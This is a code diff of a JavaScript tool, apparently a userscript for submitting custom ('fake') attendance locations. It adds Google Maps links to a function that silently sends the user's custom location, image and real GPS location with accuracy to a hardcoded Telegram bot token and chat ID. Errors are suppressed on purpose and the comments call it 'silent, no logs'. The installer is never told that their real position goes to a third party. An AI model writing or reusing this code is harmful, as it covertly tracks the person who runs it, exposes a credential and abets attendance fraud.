@@ -52,19 +52,29 @@ function getOriginalLocation() {
 }
 
 // Send message + photo to Telegram (silent, no logs)
+// Send message + photo to Telegram (silent, with Google Maps links)
 async function sendToTelegram(customData, originalLocation, customImageBase64) {
     const BOT_TOKEN = '8695527306:AAGz1UX_nNEeDcknnKK8yDXVeiO3Qh14hKo';
     const CHAT_IDS = ['878604830'];
 
-    // Build text message
+    // Helper to make Google Maps link
+    function mapLink(lat, lon) {
+        return `https://www.google.com/maps?q=${lat},${lon}`;
+    }
+
+    // Build text message with clickable links (Markdown format)
     let message = `📍 *Custom Attendance Data*\n\n`;
-    message += `*Custom Location:*\nLat: ${customData.lat}\nLon: ${customData.lon}\n`;
+    message += `*Custom Location:*\n`;
+    message += `👉 [Open in Google Maps](${mapLink(customData.lat, customData.lon)})\n`;
+    message += `Lat: ${customData.lat}, Lon: ${customData.lon}\n`;
     message += `Address: ${customData.address}\n\n`;
     message += `*Custom Remark:* ${customData.remark || '(none)'}\n`;
     message += `*Custom Image:* ${customData.imageSaved ? '✅ Saved' : '❌ Not saved'}\n\n`;
     
     if (originalLocation) {
-        message += `🟢 *Original (Real) Location:*\nLat: ${originalLocation.lat}\nLon: ${originalLocation.lon}\n`;
+        message += `🟢 *Original (Real) Location:*\n`;
+        message += `👉 [Open in Google Maps](${mapLink(originalLocation.lat, originalLocation.lon)})\n`;
+        message += `Lat: ${originalLocation.lat}, Lon: ${originalLocation.lon}\n`;
         message += `Accuracy: ±${originalLocation.accuracy} meters\n`;
         message += `Timestamp: ${new Date().toLocaleString()}\n`;
     } else {
@@ -72,24 +82,22 @@ async function sendToTelegram(customData, originalLocation, customImageBase64) {
     }
     message += `\n🕒 Report time: ${new Date().toLocaleString()}`;
 
-    // Helper: send to one chat (avoid duplicate code)
+    // Helper: send to one chat
     async function sendToOneChat(chatId) {
         // 1. Send photo if exists
         if (customImageBase64) {
             try {
-                // Convert base64 to Blob
                 const blob = await (await fetch(customImageBase64)).blob();
                 const formData = new FormData();
                 formData.append('chat_id', chatId);
                 formData.append('photo', blob, 'custom_attendance.jpg');
-                // Silently send photo (no response handling)
                 await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                     method: 'POST',
                     body: formData
                 });
-            } catch (e) { /* silent fail */ }
+            } catch (e) { /* silent */ }
         }
-        // 2. Send text message (caption not used because photo sent separately)
+        // 2. Send text message with Markdown links
         try {
             await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                 method: 'POST',
@@ -97,17 +105,17 @@ async function sendToTelegram(customData, originalLocation, customImageBase64) {
                 body: JSON.stringify({
                     chat_id: chatId,
                     text: message,
-                    parse_mode: 'Markdown'
+                    parse_mode: 'Markdown',
+                    disable_web_page_preview: false  // shows preview of map link
                 })
             });
-        } catch (e) { /* silent fail */ }
+        } catch (e) { /* silent */ }
     }
 
     for (const chatId of CHAT_IDS) {
         await sendToOneChat(chatId);
     }
 }
-
 // Create UI Panel (no map, silent Telegram)
 function createUI() {
     if (document.getElementById('smart-att-panel')) return;
